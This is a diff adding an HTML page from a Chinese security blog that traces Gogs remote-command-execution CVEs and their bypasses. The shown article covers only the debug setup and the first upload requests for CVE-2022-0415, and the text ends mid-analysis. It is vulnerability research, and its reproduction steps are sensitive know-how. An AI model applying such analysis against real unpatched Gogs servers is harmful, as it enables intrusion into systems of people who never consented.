@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"l3yx.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="最近看到Gogs命令执行漏洞（CVE-2024-56731）通告，发现Gogs因Git特性出现了很多次命令执行漏洞的修复与绕过，所以一起分析了下。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Gogs 命令执行漏洞绕过史">
+<meta property="og:url" content="https://l3yx.github.io/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/index.html">
+<meta property="og:site_name" content="l3yx&#39;s blog">
+<meta property="og:description" content="最近看到Gogs命令执行漏洞（CVE-2024-56731）通告，发现Gogs因Git特性出现了很多次命令执行漏洞的修复与绕过，所以一起分析了下。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://l3yx.github.io/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702130951189.png">
+<meta property="og:image" content="https://l3yx.github.io/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702131342409.png">
+<meta property="og:image" content="https://l3yx.github.io/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702132910881.png">
+<meta property="og:image" content="https://l3yx.github.io/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702133434652.png">
+<meta property="og:image" content="https://l3yx.github.io/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702135546546.png">
+<meta property="og:image" content="https://l3yx.github.io/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702135844403.png">
+<meta property="og:image" content="https://l3yx.github.io/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702140226291.png">
+<meta property="og:image" content="https://l3yx.github.io/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702140727714.png">
+<meta property="og:image" content="https://l3yx.github.io/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702141305194.png">
+<meta property="og:image" content="https://l3yx.github.io/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702151439054.png">
+<meta property="og:image" content="https://l3yx.github.io/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702151515085.png">
+<meta property="og:image" content="https://l3yx.github.io/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702154846712.png">
+<meta property="og:image" content="https://l3yx.github.io/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702160049315.png">
+<meta property="og:image" content="https://l3yx.github.io/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702161606057.png">
+<meta property="og:image" content="https://l3yx.github.io/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250703135433896.png">
+<meta property="og:image" content="https://l3yx.github.io/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702172059270.png">
+<meta property="og:image" content="https://l3yx.github.io/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702172344945.png">
+<meta property="og:image" content="https://l3yx.github.io/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702173308596.png">
+<meta property="og:image" content="https://l3yx.github.io/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702173535587.png">
+<meta property="og:image" content="https://l3yx.github.io/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702173848796.png">
+<meta property="og:image" content="https://l3yx.github.io/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702205054407.png">
+<meta property="og:image" content="https://l3yx.github.io/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702205308965.png">
+<meta property="og:image" content="https://l3yx.github.io/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702204148336.png">
+<meta property="og:image" content="https://l3yx.github.io/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250703142658312.png">
+<meta property="article:published_time" content="2025-07-01T06:58:03.000Z">
+<meta property="article:modified_time" content="2025-07-01T06:58:03.000Z">
+<meta property="article:author" content="淚笑">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="漏洞分析">
+<meta property="article:tag" content="Golang">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://l3yx.github.io/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702130951189.png">
+
+
+<link rel="canonical" href="https://l3yx.github.io/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://l3yx.github.io/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/","path":"2025/07/01/Gogs-命令执行漏洞绕过史/","title":"Gogs 命令执行漏洞绕过史"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Gogs 命令执行漏洞绕过史 | l3yx's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">l3yx's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2022-0415"><span class="nav-number">1.</span> <span class="nav-text">CVE-2022-0415</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.1.</span> <span class="nav-text">调试环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞复现与分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-number">1.3.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2022-1884"><span class="nav-number">2.</span> <span class="nav-text">CVE-2022-1884</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">2.1.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-1"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2022-1986"><span class="nav-number">3.</span> <span class="nav-text">CVE-2022-1986</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1"><span class="nav-number">3.1.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-2"><span class="nav-number">3.2.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2022-2024"><span class="nav-number">4.</span> <span class="nav-text">CVE-2022-2024</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-2"><span class="nav-number">4.1.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-3"><span class="nav-number">4.2.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2024-39931"><span class="nav-number">5.</span> <span class="nav-text">CVE-2024-39931</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-1"><span class="nav-number">5.1.</span> <span class="nav-text">调试环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90-1"><span class="nav-number">5.2.</span> <span class="nav-text">漏洞复现与分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-4"><span class="nav-number">5.3.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2024-54148"><span class="nav-number">6.</span> <span class="nav-text">CVE-2024-54148</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90-2"><span class="nav-number">6.1.</span> <span class="nav-text">漏洞复现与分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-5"><span class="nav-number">6.2.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2024-55947"><span class="nav-number">7.</span> <span class="nav-text">CVE-2024-55947</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90-3"><span class="nav-number">7.1.</span> <span class="nav-text">漏洞复现与分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-6"><span class="nav-number">7.2.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2024-56731"><span class="nav-number">8.</span> <span class="nav-text">CVE-2024-56731</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90-4"><span class="nav-number">8.1.</span> <span class="nav-text">漏洞复现与分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-7"><span class="nav-number">8.2.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="淚笑"
+      src="/resources/avatar.jpg">
+  <p class="site-author-name" itemprop="name">淚笑</p>
+  <div class="site-description" itemprop="description">学的越多，懂的越少</div>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/l3yx" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;l3yx" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1729888211@qq.com" title="E-Mail → mailto:1729888211@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://l3yx.github.io/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/resources/avatar.jpg">
+      <meta itemprop="name" content="淚笑">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="l3yx's blog">
+      <meta itemprop="description" content="学的越多，懂的越少">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Gogs 命令执行漏洞绕过史 | l3yx's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Gogs 命令执行漏洞绕过史
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-07-01 14:58:03" itemprop="dateCreated datePublished" datetime="2025-07-01T14:58:03+08:00">2025-07-01</time>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>2k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>7 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>最近看到<a target="_blank" rel="noopener" href="https://x.threatbook.com/v5/article?threatInfoID=161339">Gogs命令执行漏洞（CVE-2024-56731）通告</a>，发现Gogs因Git特性出现了很多次命令执行漏洞的修复与绕过，所以一起分析了下。</p>
+<span id="more"></span>
+
+<h2 id="CVE-2022-0415"><a href="#CVE-2022-0415" class="headerlink" title="CVE-2022-0415"></a>CVE-2022-0415</h2><p>影响范围 &lt;0.12.6</p>
+<h3 id="调试环境搭建"><a href="#调试环境搭建" class="headerlink" title="调试环境搭建"></a>调试环境搭建</h3><p>我一般偏向用Docker搭建漏洞环境，但不像Java应用可以很方便的开启远程调试，Go应用一般需要重新编译和三方工具<a target="_blank" rel="noopener" href="https://github.com/go-delve/delve">Delve</a>。</p>
+<p>源码版本选择了<a target="_blank" rel="noopener" href="https://github.com/gogs/gogs/archive/refs/tags/v0.12.5.zip">0.12.5</a>，从Dockerfile看到使用了Make编译Gogs源码，修改Makefile以支持调试：</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#LDFLAGS += -X &quot;gogs.io/gogs/internal/conf.BuildCommit=$(shell git rev-parse HEAD)&quot;</span></span><br><span class="line">LDFLAGS += -X <span class="string">&quot;gogs.io/gogs/internal/conf.BuildCommit=test&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="section">build:</span></span><br><span class="line">	<span class="comment">#go build $(BUILD_FLAGS) -ldflags &#x27;$(LDFLAGS)&#x27; -tags &#x27;$(TAGS)&#x27; -trimpath -o gogs</span></span><br><span class="line">	go build <span class="variable">$(BUILD_FLAGS)</span> -gcflags=<span class="string">&quot;all=-N -l&quot;</span> -ldflags &#x27;<span class="variable">$(LDFLAGS)</span>&#x27; -tags &#x27;<span class="variable">$(TAGS)</span>&#x27; -trimpath -o gogs</span><br></pre></td></tr></table></figure>
+
+<p>修改Dockerfile以安装Delve：</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#FROM alpine:3.14</span></span><br><span class="line"><span class="keyword">FROM</span> golang:alpine3.<span class="number">14</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> go install github.com/go-delve/delve/cmd/dlv@v1.21.0</span></span><br></pre></td></tr></table></figure>
+
+<p>服务启动用了s6-svscan，修改docker&#x2F;s6&#x2F;gogs&#x2F;run以Delve启动应用：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">exec</span> gosu <span class="string">&quot;<span class="variable">$USER</span>&quot;</span> /app/gogs/gogs web</span></span><br><span class="line">exec gosu &quot;$USER&quot; dlv --listen=:2345 --headless=true --api-version=2 --accept-multiclient exec /app/gogs/gogs --continue -- web</span><br></pre></td></tr></table></figure>
+
+<p>构建镜像并启动：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build . -t gogs_debug:0.12.5</span><br><span class="line">docker run --rm --name gogs -p 10022:22 -p 10880:3000 -p 2345:2345 gogs_debug:0.12.5</span><br></pre></td></tr></table></figure>
+
+<p>然后用GoLand连接远程调试即可。</p>
+<h3 id="漏洞复现与分析"><a href="#漏洞复现与分析" class="headerlink" title="漏洞复现与分析"></a>漏洞复现与分析</h3><p>注册登陆并初始化一个仓库：</p>
+<img src="/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702130951189.png" class="" title="image-20250702130951189">
+
+<p>后端文件系统中会创建一个<a target="_blank" rel="noopener" href="https://www.saintsjd.com/2011/01/what-is-a-bare-git-repository/">Git裸仓库（bare repository）</a>，即只包含版本控制数据，不包含工作目录。</p>
+<img src="/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702131342409.png" class="" title="image-20250702131342409">
+
+
+
+<p>通过Web界面上传文件涉及两个请求，首先是文件上传，会返回一个uuid：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/test/testrepo/upload-file</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryYuEc5YbAQlk2ZDIB</span><br><span class="line"></span><br><span class="line"><span class="language-subunit">------WebKitFormBoundaryYuEc5YbAQlk2ZDIB</span></span><br><span class="line"><span class="language-subunit">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.txt&quot;</span></span><br><span class="line"><span class="language-subunit">Content-Type: text/plain</span></span><br><span class="line"><span class="language-subunit"></span></span><br><span class="line"><span class="language-subunit"><span class="keyword">test</span></span></span><br><span class="line"><span class="keyword"><span class="language-subunit"></span>------WebKitFormBoundaryYuEc5YbAQlk2ZDIB--</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=UTF-8</span><br><span class="line"></span><br><span class="line"><span class="language-subunit">&#123;</span></span><br><span class="line"><span class="language-subunit">  &quot;uuid&quot;: &quot;84dd6d6f-cf8b<span class="string">-412</span>a<span class="string">-8285</span><span class="string">-5</span>ff5f5d15a99&quot;</span></span><br><span class="line"><span class="language-subunit">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>对应后端代码在<code>internal/route/repo/editor.go:514</code>：</p>
+<img src="/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702132910881.png" class="" title="image-20250702132910881">
+
+<p>其中的filename用户可控，不过无法传入含<code>/</code>的路径，只能是基础文件名。（但<code>\</code>是可以的，说不定在windows下可以进一步利用？）</p>
+<p>在<code>internal/db/repo_editor.go:330</code>中，文件内容会被保存到临时路径，文件名和uuid存入数据库：</p>
+<img src="/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702133434652.png" class="" title="image-20250702133434652">
+
+
+
+<p>第二个请求是文件提交，其中<code>files</code>就是前一个请求返回的uuid：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/test/testrepo/_upload/main/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-dts">tree_<span class="attr">path</span><span class="operator">=</span><span class="variable">&amp;files</span>=ca1d499f-f519<span class="number">-4</span>cb1-bb16<span class="number">-3</span>c4b9068ed43<span class="variable">&amp;commit_summary</span>=<span class="variable">&amp;commit_message</span>=<span class="variable">&amp;commit_choice</span>=direct<span class="variable">&amp;new_branch_name</span>=</span></span><br></pre></td></tr></table></figure>
+
+<p>对应代码在<code>internal/route/repo/editor.go:UploadFilePost</code>，处理完一些请求参数后，会在<code>internal/db/repo_editor.go:UploadRepoFiles</code>完成文件提交，首先通过uuid获取上传的文件对象：</p>
+<img src="/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702135546546.png" class="" title="image-20250702135546546">
+
+<p>然后重置并更新本地临时工作目录：</p>
